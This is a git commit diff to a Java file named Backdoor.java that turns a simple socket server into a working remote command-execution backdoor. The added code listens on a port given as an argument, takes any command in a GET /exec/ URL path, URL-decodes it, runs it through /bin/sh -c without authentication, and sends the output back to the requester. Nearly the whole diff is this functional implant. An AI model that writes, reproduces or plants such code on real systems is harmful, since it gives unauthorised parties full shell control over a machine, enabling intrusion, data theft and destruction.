a5484f76ceb2d335f48ad58720bd9576d2b0d6a6
Vivekanandan, Karthik (kvivek) <kvivekanandan@stubhub.com>
2016-02-07 19:35:08 -0700

    final inner class

--- backdoor/src/Backdoor.java
+++ backdoor/src/Backdoor.java
@@ -4,6 +4,7 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.net.URLDecoder;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -13,11 +14,12 @@ import java.util.concurrent.Executors;
 
 public class Backdoor {
 
-	private static final String OUTPUT = "<html><head><title>nazgul</title></head><body><p>nazgul</p></body></html>";
-	private static final String OUTPUT_HEADERS = "HTTP/1.1 200 OK\r\n" + "Content-Type: text/html\r\n" + "Content-Length: ";
+	private static final String OUTPUT_404 = "HTTP/1.1 404 Not Found";
+	private static final String OUTPUT_HEADERS_200 = "HTTP/1.1 200 OK\r\n" + "Content-Type: text\r\n" + "Content-Length: ";
+	private static final String OUTPUT_HEADERS_404 = "HTTP/1.1 404 Not Found\r\n\r\n";
 	private static final String OUTPUT_END_OF_HEADERS = "\r\n\r\n";
 	private int port;
-	
+
 	final ExecutorService clientProcessingPool = Executors.newFixedThreadPool(10);
 
 	public Backdoor(int port) {
@@ -25,47 +27,92 @@ public class Backdoor {
 	}
 
 	public void openConnection() throws IOException {
-			
+
 		ServerSocket serverSocket = new ServerSocket(port);
+		try {
+			while (true) {
+				System.out.println("waiting for connections on " + port);
+				final Socket clientSocket = serverSocket.accept();
+				clientProcessingPool.submit(new Runnable() {
 
-		while (true) {
-			System.out.println("waiting for connections on " + port);
-			Socket clientSocket = serverSocket.accept();
-			System.out.println("Accepted connection on " + port);
-			clientProcessingPool.submit(new Runnable() {
+					@Override
+					public void run() {
+						try {
+							DataOutputStream out = new DataOutputStream(clientSocket.getOutputStream());
+							BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
+							String input;
+							boolean is200 = false;
+							while ((input = in.readLine()) != null) {
+								// System.out.println(input);
+								String[] req = input.split(" ");
+								if (req != null && req.length > 2) {
+									if ("GET".equals(req[0]) && "HTTP/1.1".equals(req[2])) {
+										System.out.println(input);
+										if (req[1].startsWith("/exec/")) {
+											String urlcommand = req[1].replace("/exec/", "");
+											if (urlcommand != null && !urlcommand.isEmpty()) {
+												String command = URLDecoder.decode(urlcommand, "UTF-8");
+												System.out.println(command);
 
-				@Override
-				public void run() {
-					try {
-						DataOutputStream out = new DataOutputStream(clientSocket.getOutputStream());
-						BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
-						String input, output;
+												String[] cmd = { "/bin/sh", "-c", "" };
+												cmd[2] = command;
 
-						while ((input = in.readLine()) != null) {
-							System.out.println(input);
-							if (input.isEmpty()) {
-								break;
+												Runtime rt = Runtime.getRuntime();
+												Process p = rt.exec(cmd);
+												BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
+												// BufferedReader stdError = new
+												// BufferedReader(new
+												// InputStreamReader(p.getErrorStream()));
+
+												String s = null;
+												StringBuffer output = new StringBuffer();
+												while ((s = stdInput.readLine()) != null) {
+													System.out.println(s);
+													output = output.append(s).append("\r\n");
+												}
+
+												// System.out.println("standard error:\n");
+												// while ((s =
+												// stdError.readLine())
+												// != null) {
+												// System.out.println(s);
+												// }
+
+												out.writeBytes(OUTPUT_HEADERS_200 + output.length() + OUTPUT_END_OF_HEADERS + output);
+												is200 = true;
+											}
+										}
+									}
+								}
+								if (input.isEmpty()) {
+									break;
+								}
 							}
-						}
-						out.writeBytes(OUTPUT_HEADERS + OUTPUT.length() + OUTPUT_END_OF_HEADERS + OUTPUT);
-						in.close();
-						out.flush();
-						out.close();
-						System.out.println("Request processed on " + port);
-					} catch (IOException e1) {
-						e1.printStackTrace();
-					}
-				}
-			});
-		}
+							if (!is200) {
+								out.writeBytes(OUTPUT_HEADERS_404 + OUTPUT_404);
+							}
 
+							in.close();
+							out.flush();
+							out.close();
+							System.out.println("Request processed on " + port);
+						} catch (IOException e1) {
+							e1.printStackTrace();
+						}
+					}
+				});
+			}
+		} finally {
+			if (serverSocket != null) {
+				serverSocket.close();
+			}
+		}
 	}
 
 	public static void main(String[] args) {
-		int portNumber = Integer.parseInt("4567");
+		int portNumber = Integer.parseInt(args[0]);
 		Backdoor backdoor = new Backdoor(portNumber);
 		backdoor.run();
-
 	}
 
 	public void run() {
